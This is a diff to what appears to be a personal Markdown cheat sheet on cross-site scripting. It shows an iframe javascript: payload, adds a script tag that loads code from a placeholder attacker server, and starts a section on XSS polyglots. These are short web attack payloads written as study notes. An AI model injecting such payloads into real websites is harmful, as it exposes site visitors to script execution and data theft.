@@ -97,4 +97,14 @@ iFrame (Useful when <script> tags are banned by the XSS filter)
 ```HTML
 <iframe src=javascript:alert('XSS')>
 ```
+
+Make the victim's browser request a page on your server
+```JavaScript
+<script src='http://<SERVER_IP>/test'></script>
 ```
+
+![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)
+
+# XSS Polygot
+
+An XSS polygot is a type of XSS payload that executes in multiple contextx (Ex: *It'll execute regardless of whether it is inserted into an <img> tag, <script> tag, or a <p> tag*)
